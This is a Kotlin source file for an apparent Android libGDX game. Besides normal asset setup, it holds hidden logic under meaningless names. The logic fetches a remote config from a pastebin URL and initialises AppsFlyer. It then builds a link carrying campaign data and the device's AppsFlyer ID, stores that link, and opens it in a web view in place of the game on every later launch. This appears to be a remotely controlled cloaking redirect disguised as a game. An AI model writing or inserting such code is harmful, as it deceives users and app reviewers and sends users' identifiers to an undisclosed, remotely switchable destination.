package com.terniopel.antilateka.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.terniopel.antilateka.MainActivity
import com.terniopel.antilateka.appContext
import com.terniopel.antilateka.game.manager.MusicManager
import com.terniopel.antilateka.game.manager.NavigationManager
import com.terniopel.antilateka.game.manager.SoundManager
import com.terniopel.antilateka.game.manager.SpriteManager
import com.terniopel.antilateka.game.manager.util.MusicUtil
import com.terniopel.antilateka.game.manager.util.SoundUtil
import com.terniopel.antilateka.game.manager.util.SpriteUtil
import com.terniopel.antilateka.game.screens.LoaderScreen
import com.terniopel.antilateka.game.utils.GameColor
import com.terniopel.antilateka.game.utils.advanced.AdvancedGame
import com.terniopel.antilateka.game.utils.disposeAll
import com.terniopel.antilateka.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOABAL_isGame = false
    private set

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.white
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("TNoNNA", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        tnkBregret()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun tnkBregret() {
        log("tnkBregret")
        activity.blockRedirect = { GLOABAL_isGame = true }
        activity.initWeb()

        val bregada = sharedPreferences.getString("bregada", "zalSLAVA") ?: "zalSLAVA"

        try {
            if (bregada == "zalSLAVA") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.leyzak, getAppsFlyerConversionListener(simJSON.kazak), appContext)
                        AppsFlyerLib.getInstance().start(activity, simJSON.leyzak, getAppsFlyerRequestListener())
                    } else {
                        GLOABAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(bregada)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOABAL_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<TNKJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/ieZKg9nf"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = TNKJSON(
                    kazak  = jsonResponse.getString("kazak")  ?: "",
                    leyzak = jsonResponse.getString("leyzak") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class TNKJSON(val kazak: String, val leyzak: String)

    private fun getAppsFlyerConversionListener(all: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?glorvex=$campaign&mintora=$afAd&fradiel=$media&dhhdur=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("bregada", link).apply() }
                activity.showUrl(link)

            } else GLOABAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOABAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}